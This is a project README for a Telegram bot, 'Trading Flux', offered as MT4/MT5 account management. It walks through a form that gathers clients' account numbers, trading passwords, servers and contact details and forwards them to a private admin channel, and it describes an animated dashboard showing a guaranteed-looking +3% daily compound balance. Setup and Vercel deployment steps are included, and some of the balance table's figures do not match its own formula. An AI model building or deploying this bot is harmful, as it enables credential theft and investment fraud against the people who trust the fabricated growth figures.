# 📈 Trading Flux — Telegram Account Management Bot

A professional Telegram bot for MT4/MT5 account management services. Collects client credentials via a guided multi-step form, forwards them to a private admin channel, and shows an animated live balance growing at **+3% daily**.

---

## Features

- **9-step guided form** — collects platform, broker, account number, passwords, server, deposit, name, email
- **Admin channel forwarding** — all submissions sent instantly to your private Telegram channel
- **Animated balance dashboard** — live `/balance` command with compound growth display (3% daily)
- **Progress bars** — visual daily and total growth trackers
- **Vercel serverless** — zero cold-start issues, scales automatically
- **GitHub-ready** — no platform lock-in, runs anywhere Node.js runs

---

## Bot Commands

| Command | Description |
|---------|-------------|
| `/start` | Welcome message and intro |
| `/register` | Start the account submission form |
| `/balance` | View live animated balance dashboard |
| `/cancel` | Cancel current form |
| `/help` | Show all commands |

---

## Setup

### 1. Clone the repo

```bash
git clone https://github.com/YOUR_USERNAME/tradingflux-bot.git
cd tradingflux-bot
npm install
```

### 2. Create a bot via @BotFather

1. Open Telegram → search `@BotFather`
2. Send `/newbot`
3. Name it **Trading Flux**, username e.g. `tradingflux_bot`
4. Copy the token

### 3. Get your admin channel ID

1. Create a private Telegram channel
2. Add `@userinfobot` to the channel
3. It will show the channel ID (starts with `-100...`)
4. Remove `@userinfobot` after noting the ID

### 4. Configure environment variables

```bash
cp .env.example .env
```

Fill in `.env`:

```env
TELEGRAM_BOT_TOKEN=7123456789:AAF...
ADMIN_CHANNEL_ID=-1001234567890
WEBHOOK_URL=https://your-app.vercel.app
```

### 5. Run locally (polling mode)

```bash
npm run dev
```

---

## Deploy to Vercel

### Option A — Vercel CLI

```bash
npm i -g vercel
vercel login
vercel

# Set secrets in Vercel
vercel env add TELEGRAM_BOT_TOKEN
vercel env add ADMIN_CHANNEL_ID
vercel env add WEBHOOK_URL   # e.g. https://tradingflux.vercel.app

# Deploy to production
vercel --prod
```

### Option B — Vercel Dashboard (GitHub integration)

1. Push this repo to GitHub
2. Go to [vercel.com](https://vercel.com) → New Project → Import from GitHub
3. Add environment variables in the Vercel dashboard:
   - `TELEGRAM_BOT_TOKEN`
   - `ADMIN_CHANNEL_ID`
   - `WEBHOOK_URL` (your Vercel app URL, e.g. `https://tradingflux-bot.vercel.app`)
4. Deploy

### Register the Webhook

After deploying, open this URL once in your browser to register the webhook:

```
https://your-app.vercel.app/api/set-webhook
```

You should see:
```json
{ "telegramResponse": { "ok": true, "result": true } }
```

---

## Project Structure

```
tradingflux-bot/
├── api/
│   ├── webhook.ts        # Vercel serverless — receives Telegram updates
│   └── set-webhook.ts    # One-time webhook registration endpoint
├── src/
│   ├── index.ts          # Bot setup + entry point
│   ├── sessions.ts       # In-memory session store
│   ├── types.ts          # TypeScript interfaces
│   ├── handlers/
│   │   ├── form.ts       # 9-step registration form logic
│   │   └── balance.ts    # /balance command with animated display
│   └── utils/
│       ├── balance.ts    # Compound growth calculations + display
│       └── format.ts     # Message formatters (admin + user messages)
├── .env.example
├── vercel.json
├── package.json
└── tsconfig.json
```

---

## Balance Calculation

The balance display uses **daily compound interest at 3%**:

```
Balance = Principal × (1.03)^days
```

Example — $5,000 deposit:

| Day | Balance |
|-----|---------|
| 0 | $5,000.00 |
| 7 | $6,149.37 |
| 14 | $7,547.04 |
| 30 | $12,136.31 |
| 60 | $29,522.03 |

---

## Scaling

For high volume, replace the in-memory session store (`src/sessions.ts`) with **Upstash Redis**:

```bash
npm install @upstash/redis
```

---

## License

MIT
